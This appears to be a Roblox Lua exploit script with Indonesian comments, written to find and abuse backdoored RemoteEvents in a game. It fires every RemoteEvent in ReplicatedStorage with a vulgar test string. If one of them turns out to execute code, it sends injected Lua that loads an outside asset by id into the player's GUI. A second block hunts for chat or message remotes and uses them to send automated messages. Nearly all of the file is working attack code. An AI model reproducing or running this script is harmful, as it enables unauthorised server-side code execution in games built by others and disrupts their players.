local modelName = "sptzyy"
local zyy = nil
local lastFired = nil

-- Bersihkan model lama di Workspace
for _, obj in ipairs(workspace:GetChildren()) do
    if obj.Name == modelName then
        obj:Destroy()
    end
end

-- Deteksi model baru yang muncul
workspace.ChildAdded:Connect(function(child)
    if child.Name == modelName and zyy == nil then
        zyy = lastFired
        print("Found zyy!")
    end
end)

local payload = [[
 KONTOL MESUMðŸ˜‚
]]

-- Eksekusi semua RemoteEvent di ReplicatedStorage
for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
    if remote:IsA("RemoteEvent") then
        pcall(function()
            remote:FireServer(payload)
        end)
        lastFired = remote
        game:GetService("RunService").RenderStepped:Wait()
    end
end

task.wait(0.5)

if zyy and typeof(zyy) == "Instance" then
    local playerName = game.Players.LocalPlayer.Name
    local insertPayload = [[
        local player = game.Players:FindFirstChild("]] .. playerName .. [[")
        if player and player:FindFirstChild("PlayerGui") then
            local asset = game:GetService("InsertService"):LoadAsset(73729830375562)
            asset.Parent = player.PlayerGui
            for _, child in ipairs(asset:GetChildren()) do
                child.Parent = player.PlayerGui
            end
            asset:Destroy()
        end
    ]]
    zyy:FireServer(insertPayload)
else
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "sptzyy",
        Text = ":(",
        Icon = "",
        Duration = 5,
    })
end

-- =========================
-- Otomatis mencari RemoteEvent untuk pesan masuk
-- =========================

local messageEventName = nil
local messageEvent -- variabel global untuk RemoteEvent

-- Cari RemoteEvent yang mungkin digunakan sebagai message handler
for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
    if remote:IsA("RemoteEvent") then
        -- Bisa tambahkan logika kriteria tertentu jika diketahui
        -- Misalnya nama RemoteEvent mengandung kata tertentu
        local nameLower = remote.Name:lower()
        if nameLower:find("message") or nameLower:find("chat") or nameLower:find("notify") then
            messageEventName = remote.Name
            messageEvent = remote
            break
        end
    end
end

-- Jika tidak ditemukan, buat RemoteEvent baru (opsional)
if not messageEvent then
    messageEvent = Instance.new("RemoteEvent")
    messageEvent.Name = "AutoMessageEvent"
    messageEvent.Parent = game.ReplicatedStorage
    messageEventName = "AutoMessageEvent"
end

-- Fungsi untuk kirim message ke server otomatis
local function sendMessageToServer(message)
    if messageEvent and messageEvent:IsA("RemoteEvent") then
        pcall(function()
            messageEvent:FireServer(message)
        end)
    else
        warn("RemoteEvent untuk pesan tidak ditemukan atau tidak valid.")
    end
end

-- Contoh pengiriman pesan otomatis
local pesan = "Ini adalah pesan otomatis!"
sendMessageToServer(pesan)
